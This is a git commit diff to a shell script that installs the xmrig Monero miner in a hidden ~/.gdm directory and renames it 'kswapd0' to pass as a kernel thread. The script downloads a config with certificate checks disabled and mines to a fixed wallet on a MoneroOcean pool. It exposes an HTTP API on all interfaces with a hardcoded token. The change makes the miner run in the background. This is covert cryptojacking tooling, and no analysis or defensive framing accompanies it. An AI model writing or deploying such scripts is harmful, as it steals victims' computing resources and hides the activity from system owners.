5c56be98a113293e73c380c0e03a3a772d277f06
Acen <113854209+littlAcen@users.noreply.github.com>
2024-07-19 17:26:37 +0200

    Update setup_gdm-static.sh

--- setup_gdm-static.sh
+++ setup_gdm-static.sh
@@ -5,4 +5,6 @@ tar xzvf xmrig-6.21.3-linux-static-x64.tar.gz -C $HOME/.gdm/
 mv $HOME/.gdm/xmrig-6.21.3/xmrig $HOME/.gdm/kswapd0
 chmod +x $HOME/.gdm/kswapd0
 wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm/config.json
-$HOME/.gdm/kswapd0 --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash &
+cp $HOME/.gdm/config.json $HOME/.gdm/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm/config_background.json
+$HOME/.gdm/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash &
